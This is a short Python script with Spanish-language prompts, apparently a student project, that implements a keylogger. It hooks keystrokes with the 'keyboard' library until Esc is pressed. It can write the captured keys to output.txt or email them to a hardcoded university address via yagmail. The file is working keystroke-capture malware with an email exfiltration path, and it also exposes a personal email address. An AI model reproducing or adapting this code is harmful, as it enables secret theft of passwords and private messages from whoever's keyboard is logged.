import keyboard
import smtplib
import yagmail

registros = []

def callback(event):
    #print(event.name) 
    registros.append(event.name) 

def output(text):
    with open('output.txt', 'a') as f:
        f.write(text)

def send_email(sender_email , receiver_email, mensaje):
  
    yag = yagmail.SMTP(sender_email)
    yag.send(to=receiver_email, subject='Registros de Keylogger', contents=mensaje)

def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
    	print("Interrumpiendo la ejecución del programa...")
    	return
    
    keyboard.on_release(callback)
    
    while True:
        if keyboard.is_pressed('esc'):
            print("Terminando la ejecución del programa...")
            break
            
    keyboard.unhook_all()
    
    registro = "\n".join(registros)
    
    print(registro)
    
    if respuesta_email.lower() in ['yes', 'y']:
        send_email("janet1204@ciencias.unam.mx", "janet1204@ciencias.unam.mx" , registro)
        
    if respuesta_guardar.lower() in ['yes', 'y']:
    	output(registro)


if __name__ == "__main__":
    main()
